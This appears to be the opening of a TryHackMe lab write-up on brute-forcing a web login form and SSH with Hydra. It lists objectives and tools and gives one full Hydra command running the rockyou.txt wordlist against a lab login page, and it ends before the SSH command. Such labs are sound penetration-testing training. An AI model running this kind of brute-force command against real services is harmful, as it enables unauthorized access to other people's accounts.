# TryHackMe — Hydra Brute Force Challenge

## Overview

This lab focuses on using Hydra to perform brute force attacks against web authentication and SSH services.

Hydra is a powerful password cracking tool used in penetration testing to identify weak credentials.

---

## Objectives

- Perform brute force attack on web login form
- Perform brute force attack on SSH service
- Identify valid credentials using wordlists
- Gain authorized access to target system
- Retrieve flags

---

## Tools Used

- Hydra
- Linux AttackBox
- rockyou.txt wordlist
- SSH
- Web browser

---

## Commands Used

### Web Login Brute Force

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.167.90 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
